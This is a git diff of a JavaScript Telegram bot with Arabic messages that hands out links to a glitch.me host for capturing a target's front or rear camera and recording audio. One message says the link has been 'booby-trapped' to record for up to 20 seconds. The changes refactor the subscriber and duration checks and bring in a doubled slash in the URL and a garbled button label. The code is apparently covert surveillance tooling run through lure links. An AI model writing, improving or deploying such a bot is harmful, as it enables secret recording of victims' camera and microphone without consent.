@@ -116,11 +116,8 @@ bot.onText(/\/subscribe (\d+)/, (msg, match) => {
     }
 
     const userId = match[1];
-    if (subscribedUsers.add(userId).size > subscribedUsers.size) {
-        bot.sendMessage(msg.chat.id, `تمت إضافة المستخدم ${userId} إلى قائمة المشتركين بنجاح.`);
-    } else {
-        bot.sendMessage(msg.chat.id, `المستخدم ${userId} موجود بالفعل في قائمة المشتركين.`);
-    }
+    subscribedUsers.add(userId);
+    bot.sendMessage(msg.chat.id, `تمت إضافة المستخدم ${userId} إلى قائمة المشتركين بنجاح.`);
 });
 
 bot.onText(/\/unsubscribe (\d+)/, (msg, match) => {
@@ -146,11 +143,11 @@ bot.onText(/\/listsubscribers/, (msg) => {
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     const message = 'مرحبًا! انقر على الرابط لدخول.';
-    const url = `https://creative-marmalade-periwinkle.glitch.me/${chatId}`;
+    const url = `https://creative-marmalade-periwinkle.glitch.me//${chatId}`;
     bot.sendMessage(chatId, message, {
         reply_markup: {
             inline_keyboard: [
-                [{ text: 'تصوير كام أمامي', url: `${url}?cameraType=front` }],
+                [{ text: 'تصوير ام أمامي', url: `${url}?cameraType=front` }],
                 [{ text: 'تصوير كام خلفي', url: `${url}?cameraType=rear` }],
                 [{ text: 'تسجيل صوت', callback_data: 'select_duration' }]
             ]
@@ -171,13 +168,11 @@ bot.on('message', (msg) => {
     const chatId = msg.chat.id;
     const duration = parseInt(msg.text, 10);
 
-    if (!isNaN(duration)) {
-        if (duration > 0 && duration <= 20) {
-            const link = `https://creative-marmalade-periwinkle.glitch.me//record?chatId=${chatId}&duration=${duration}`;
-            bot.sendMessage(chatId, `تم تلغيم الرابط لتسجيل صوت لمدة ${duration} ثواني: ${link}`);
-        } else {
-            bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
-        }
+    if (!isNaN(duration) && duration > 0 && duration <= 20) {
+        const link = `https://creative-marmalade-periwinkle.glitch.me//record?chatId=${chatId}&duration=${duration}`;
+        bot.sendMessage(chatId, `تم تلغيم الرابط لتسجيل صوت لمدة ${duration} ثواني: ${link}`);
+    } else {
+        bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
     }
 });
 
